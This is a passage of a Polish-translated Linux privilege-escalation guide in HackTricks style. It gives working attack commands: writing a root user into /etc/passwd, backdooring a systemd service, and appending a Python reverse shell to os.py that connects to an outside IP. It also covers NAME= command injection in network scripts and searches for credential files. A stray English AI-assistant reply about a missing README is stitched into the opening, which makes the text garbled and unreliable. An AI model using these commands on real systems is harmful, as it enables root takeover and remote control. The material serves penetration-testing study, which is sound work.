Najpierw wygeneruj hasło za pomocą jednego z następujących poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md — please paste the file here (or the relevant portion) and I will translate it to Polish, preserving all markdown/html/tags/paths exactly as requested.

I can't create system users on your machine. If you want, I can also:
- generate a secure password and include it in the translated README where you indicate, and
- provide the exact commands you can run to add the user `hacker` and set that password (e.g. useradd, chpasswd, or passwd commands).

Tell me whether you want me to generate a password and where to place the user/password in the file, then paste the README content.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie, możesz użyć poniższych poleceń, aby dodać użytkownika bez hasła.\
UWAGA: możesz obniżyć aktualne bezpieczeństwo maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, także `/etc/shadow` jest przemianowany na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisywać w niektórych wrażliwych plikach**. Na przykład, czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **zmodyfikować plik konfiguracyjny usługi Tomcat w /etc/systemd/,** wtedy możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie uruchomiony przy następnym starcie tomcat.

### Sprawdź foldery

Poniższe foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwna lokalizacja/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/binaria w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przejrzyj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), wyszukuje **kilka możliwych plików, które mogą zawierać hasła**.\
**Innym interesującym narzędziem** które możesz użyć do tego celu jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) które jest aplikacją open source służącą do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logi

Jeśli potrafisz czytać logi, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy log, tym bardziej (prawdopodobnie) będzie interesujący.\
Ponadto niektóre "**źle**" skonfigurowane (backdoored?) **logi audytu** mogą pozwolić Ci **zapisać hasła** wewnątrz logów audytu, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby móc **czytać logi**, bardzo pomocna będzie grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group).

### Pliki shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś także sprawdzić pliki zawierające słowo "**password**" w ich **nazwie** lub w **zawartości**, a także wyszukać IPs i emails w logach, lub regexps dla hashes.\  
Nie będę tu opisywać, jak to wszystko zrobić, ale jeśli jesteś zainteresowany możesz sprawdzić ostatnie sprawdzenia, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

Jeśli wiesz, z **jakiego miejsca** zostanie uruchomiony skrypt python i **możesz zapisywać w** tym folderze lub możesz **modify python libraries**, możesz zmodyfikować OS library i backdoor it (jeśli możesz zapisać tam, gdzie będzie uruchamiany skrypt python, skopiuj i wklej bibliotekę os.py).

Aby **backdoor the library** dodaj na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate eksploatacja

Wrażliwość w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** na pliku logu lub w jego katalogach nadrzędnych potencjalnie uzyskać eskalację uprawnień. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, może zostać zmanipulowany do wykonania dowolnych plików, zwłaszcza w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale też w każdym katalogu, gdzie stosowana jest rotacja logów.

> [!TIP]
> Ta luka dotyczy wersji `logrotate` `3.18.0` i starszych

Bardziej szczegółowe informacje o luce znajdują się tutaj: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę podatność za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc gdy tylko stwierdzisz, że możesz modyfikować logi, sprawdź, kto je obsługuje i czy możesz eskalować uprawnienia, podstawiając logi jako symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z jakiegoś powodu użytkownik jest w stanie **zapisac** skrypt `ifcf-<whatever>` do _/etc/sysconfig/network-scripts_ **LUB** może **zmodyfikować** istniejący, to twój **system jest pwned**.

Skrypty sieciowe, np. _ifcg-eth0_, są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak są one ~sourced~ na Linux przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany poprawnie. Jeśli w NAME występuje **spacja / white/blank space**, system próbuje wykonać część po tej spacji. To oznacza, że **wszystko po pierwszej spacji jest wykonywane jako root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zauważ pustą spację między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuksie**. Zawiera skrypty do `start`, `stop`, `restart` i czasami `reload` usług. Mogą być uruchamiane bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest związany z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, który używa plików konfiguracyjnych do zarządzania usługami. Pomimo przejścia na Upstart, skrypty SysVinit są nadal używane obok konfiguracji Upstart dzięki warstwie kompatybilności w Upstart.

**systemd** pojawia się jako nowoczesny menedżer init i usług, oferując zaawansowane funkcje takie jak uruchamianie daemonów na żądanie, zarządzanie automount oraz migawki stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucji i `/etc/systemd/system/` dla modyfikacji administratora, upraszczając proces administracji systemem.

## Inne Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Frameworki do rootowania Androida często hookują syscall, aby udostępnić uprzywilejowaną funkcjonalność jądra menedżerowi w userspace. Słaba autoryzacja menedżera (np. sprawdzenia sygnatur oparte na FD-order lub słabe schematy haseł) może pozwolić lokalnej aplikacji na podszycie się pod menedżera i eskalację do root na urządzeniach już zrootowanych. Dowiedz się więcej i szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Oparte na regexach wykrywanie usług w VMware Tools/Aria Operations może wyodrębnić ścieżkę do binarki z linii poleceń procesu i uruchomić ją z opcją -v w uprzywilejowanym kontekście. Permisywne wzorce (np. użycie \S) mogą dopasować słuchacze podstawione przez atakującego w zapisywalnych lokalizacjach (np. /tmp/httpd), prowadząc do wykonania jako root (CWE-426 Untrusted Search Path).

Dowiedz się więcej i zobacz uogólniony wzorzec mający zastosowanie również do innych stosów discovery/monitoringu tutaj:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Ochrony jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeruje luki jądra w Linux i macOS [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zestawienie większej liczby skryptów**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referencje

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
